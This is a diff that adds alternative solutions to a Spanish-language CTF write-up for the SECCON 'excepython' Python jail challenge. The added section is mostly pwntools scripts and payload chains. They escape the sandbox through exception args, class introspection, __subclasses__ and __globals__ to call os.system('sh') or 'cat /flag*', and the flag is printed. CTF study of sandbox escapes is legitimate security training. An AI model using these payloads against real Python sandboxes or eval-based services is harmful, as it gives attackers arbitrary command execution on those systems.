@@ -216,6 +216,158 @@ if __name__ == '__main__':
     main()
 ```
 
+## Otras maneras
+
+Mediante el uso de `funciones Lambada` se puede llegar a la misma conclusión:
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+if args.DEBUG:
+    context.log_level = "DEBUG"
+
+host, port = "excepython.seccon.games", 5000
+
+rr  = lambda *x, **y: io.recvrepeat(*x, **y)
+ru  = lambda *x, **y: io.recvuntil(*x, **y)
+rl  = lambda *x, **y: io.recvline(*x, **y)
+rc  = lambda *x, **y: io.recv(*x, **y)
+sla = lambda *x, **y: io.sendlineafter(*x, **y)
+sa  = lambda *x, **y: io.sendafter(*x, **y)
+sl  = lambda *x, **y: io.sendline(*x, **y)
+sn  = lambda *x, **y: io.send(*x, **y)
+
+# -- Exploit goes here --
+
+io = remote(host, port)
+
+payloads = """
+    1/0
+
+    # args[0] = lambda function
+    # args[1] = exception instance
+    # args[2] = attribute name to get from exception instance
+
+    # (lambda, ZeroDivisionError('division by zero'))
+    {}[ lambda *args: [args[0]] + [args[1].__getattribute__( *args[2:][-2:] )], ex ]
+
+    # (lambda .__class__, <class 'ZeroDivisionError'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]+["__class__"] )][1] ]
+
+    # (lambda .__class__, <class 'type'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__class__"] )][1] ]
+
+    # (lambda .__base__, <class 'object'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__base__"] )][1] ]
+
+    # (lambda .__subclasses__, <built-in method __subclasses__>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__subclasses__"] )][1] ]
+
+    # (lambda .__subclasses__(), <class 'os._wrap_close'>)
+    {}[ *[ a:=ex.args[0], [a[0]]+[a[1]()[167]] ][1] ]
+
+    # (lambda, <function _wrap_close.__init__>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__init__"] )][1] ]
+
+    # (<built-in function system>, )
+    {}[ [a:=ex.args[0], a[0]( *[*a]+["__globals__"] )[1]["system"] ][1] ]
+
+    ex.args[0]("sh")
+"""
+
+for payload in payloads.strip().splitlines():
+    payload = payload.strip()
+    if payload.startswith("#"): continue
+    payload = payload.split("#", 1)[0].strip()
+    if not payload: continue
+    sla(b"jail> ", payload.strip().encode())
+
+io.interactive() # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+io.close()
+```
+
+Otra forma con `funciones Lambda`:
+
+```py
+{}[lambda f: ''.__class__,ex]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__base__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__subclasses__(),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[*[x:=ex.args[0],x][0][0](x[1])] # edited to unpack subclasses
+{}[lambda f: [c for c in f if 'wrap_close' in ''.__class__(c)][0],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__init__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__globals__['sys'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.modules['os'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.system('sh'),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+```
+
+Otra solución en 3 líneas es la siguiente:
+
+```py
+x
+'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
+ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')
+```
+
+Otra solución compacta:
+
+```py
+from pwn import *
+
+context(log_level="DEBUG")
+
+io = remote("excepython.seccon.games", 5000)
+
+# attack chain:
+# [].__setattr__.__objclass__.__subclasses__()[167].__init__.__globals__["system"]("sh")
+io.recvuntil(b"jail>")
+io.sendline(b"{}[f := lambda x: x[0].__getattribute__(*x[1:])]")
+io.recvuntil(b"jail>")
+io.sendline(b"{}[f := ex.args[0], g := lambda x: f([x[0]]+x)]")
+io.recvuntil(b"jail>")
+io.sendline(b'{}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]')
+io.recvuntil(b"jail>")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]')
+io.recvuntil(b"jail>")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]')
+io.recvuntil(b"jail>")
+io.sendline(b"{}[g := ex.args[0], g[1]()[167]]")
+io.recvuntil(b"jail>")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]')
+io.recvuntil(b"jail>")
+io.sendline(
+    b'{}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]'
+)
+io.recvuntil(b"jail>")
+io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')
+
+# cat /flag*
+# SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+io.interactive()
+```
+
 ## Flag
 
 `SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}`
